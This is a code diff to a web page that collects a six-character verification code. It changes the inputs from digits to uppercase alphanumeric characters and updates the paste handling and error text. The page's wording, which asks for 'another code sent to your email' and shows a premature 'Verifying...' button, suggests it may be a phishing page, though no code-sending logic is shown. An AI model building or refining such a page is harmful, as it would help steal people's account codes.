@@ -84,12 +84,13 @@ h2{
   width:52px;
   height:60px;
   text-align:center;
-  font-size:28px;
+  font-size:24px;
   font-weight:600;
   border:2px solid #e5e7eb;
   border-radius:14px;
   background:#fff;
   transition:all 0.2s;
+  text-transform:uppercase;
 }
 .otp-input:focus{
   outline:none;
@@ -170,12 +171,12 @@ button:disabled{
     <p class="subtext">Additional authentication required to protect your account.<br>For extra security purposes; to prevent unauthorized access, we have added this verification page. Please enter another code sent to your email.</p>
 
     <div class="otp-group" id="otpGroup">
-      <input type="text" class="otp-input" maxlength="1" pattern="\d*" inputmode="numeric" id="digit1">
-      <input type="text" class="otp-input" maxlength="1" pattern="\d*" inputmode="numeric" id="digit2">
-      <input type="text" class="otp-input" maxlength="1" pattern="\d*" inputmode="numeric" id="digit3">
-      <input type="text" class="otp-input" maxlength="1" pattern="\d*" inputmode="numeric" id="digit4">
-      <input type="text" class="otp-input" maxlength="1" pattern="\d*" inputmode="numeric" id="digit5">
-      <input type="text" class="otp-input" maxlength="1" pattern="\d*" inputmode="numeric" id="digit6">
+      <input type="text" class="otp-input" maxlength="1" id="digit1">
+      <input type="text" class="otp-input" maxlength="1" id="digit2">
+      <input type="text" class="otp-input" maxlength="1" id="digit3">
+      <input type="text" class="otp-input" maxlength="1" id="digit4">
+      <input type="text" class="otp-input" maxlength="1" id="digit5">
+      <input type="text" class="otp-input" maxlength="1" id="digit6">
     </div>
 
     <button id="verifyBtn">Verifying...</button>
@@ -199,7 +200,11 @@ button:disabled{
 
   inputs.forEach((id, index) => {
     const input = document.getElementById(id);
+    
     input.addEventListener('input', (e) => {
+      if (e.target.value.length === 1) {
+        e.target.value = e.target.value.toUpperCase();
+      }
       if (e.target.value.length === 1 && index < 5) {
         document.getElementById(inputs[index + 1]).focus();
       }
@@ -218,17 +223,21 @@ button:disabled{
         verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
       }
     });
+    
     input.addEventListener('keydown', (e) => {
       if (e.key === 'Backspace' && !e.target.value && index > 0) {
         document.getElementById(inputs[index - 1]).focus();
       }
     });
+    
     input.addEventListener('paste', (e) => {
       e.preventDefault();
       const pasted = (e.clipboardData || window.clipboardData).getData('text');
-      const digits = pasted.replace(/\D/g, '').slice(0, 6);
-      digits.split('').forEach((digit, i) => {
-        if (inputs[i]) document.getElementById(inputs[i]).value = digit;
+      const chars = pasted.slice(0, 6).toUpperCase();
+      chars.split('').forEach((char, i) => {
+        if (inputs[i]) {
+          document.getElementById(inputs[i]).value = char;
+        }
       });
       let allFilled = true;
       for (let i = 0; i < inputs.length; i++) {
@@ -288,7 +297,7 @@ button:disabled{
     if (isProcessing) return;
     const otp = getOTP();
     if (!otp || otp.length !== 6) {
-      errorDiv.textContent = 'Please enter all 6 digits';
+      errorDiv.textContent = 'Please enter all 6 characters';
       errorDiv.style.display = 'block';
       return;
     }
